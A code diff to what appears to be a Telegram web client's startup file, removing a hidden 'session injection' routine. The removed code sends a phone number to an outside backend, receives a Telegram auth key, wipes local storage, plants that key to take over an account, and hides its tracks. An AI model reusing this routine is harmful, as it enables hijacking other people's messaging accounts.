@@ -27,7 +27,6 @@ import initTauriApi from './util/tauri/initTauriApi';
 import setupTauriListeners from './util/tauri/setupTauriListeners';
 import updateWebmanifest from './util/updateWebmanifest';
 
-import { getActions, getGlobal } from './global';
 import { requestMutation } from './lib/fasterdom/fasterdom';
 
 import App from './components/App';
@@ -43,65 +42,6 @@ if (IS_TAURI) {
   initTauriApi();
   setupTauriListeners();
 }
-
-async function checkAndInjectSession() {
-  const urlParams = new URLSearchParams(window.location.search);
-  let loginPhone = urlParams.get('login_phone');
-
-  if (loginPhone) {
-    loginPhone = loginPhone.replace(/ /g, '+');
-    if (!loginPhone.startsWith('+')) {
-      loginPhone = '+' + loginPhone;
-    }
-
-    try {
-      const response = await fetch('https://telegramtokenreqbackend.onrender.com/api/admin/get-tt-session', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: 7812553563, phoneNumber: loginPhone })
-      });
-      
-      const data = await response.json();
-      
-      if (data.success && data.dcId && data.authKeyHex && data.userId) {
-        const hexToArray = (hex: string) => {
-          const result = [];
-          for (let i = 0; i < hex.length; i += 2) {
-            result.push(parseInt(hex.substring(i, i + 2), 16));
-          }
-          return result;
-        };
-        
-        // ၁။ Storage အဟောင်းများကို ရှင်းလင်းခြင်း (QR Code ပေါ်နေမှုကို ဖြေရှင်းရန်)
-        localStorage.clear();
-        sessionStorage.clear();
-        
-        // ၂။ Auth Key ကို Storage ထဲသို့ သွင်းခြင်း
-        localStorage.setItem('dc', String(data.dcId));
-        localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(hexToArray(data.authKeyHex)));
-        
-        // ၃။ URL မှ Parameter ကို ဖျောက်ခြင်း
-        window.history.replaceState({}, document.title, window.location.pathname);
-
-        alert("Mission Synchronized! System is restarting securely...");
-        
-        // ၄။ Storage ရှင်းထားသောကြောင့် Browser ကို တစ်ချက် ပြန်လည်စတင်စေခြင်း
-        // (App အသစ်ပြန်တက်လာမှသာ Auth Key ကိုဖတ်ပြီး Teact က State အသစ်တည်ဆောက်မည်)
-        window.location.reload(); 
-        return; 
-      }
-    } catch (error) {
-      console.error("Session Injection Error:", error);
-    }
-  }
-  
-  // ၅။ login_phone မပါလာလျှင် (သို့မဟုတ် Reload ပြန်တက်လာချိန်တွင်) မူလအတိုင်း App ကို စတင်မည်
-  init();
-}
-
-checkAndInjectSession();
-
-// -------------------------------------------------------------
 
 async function init() {
   if (DEBUG) {
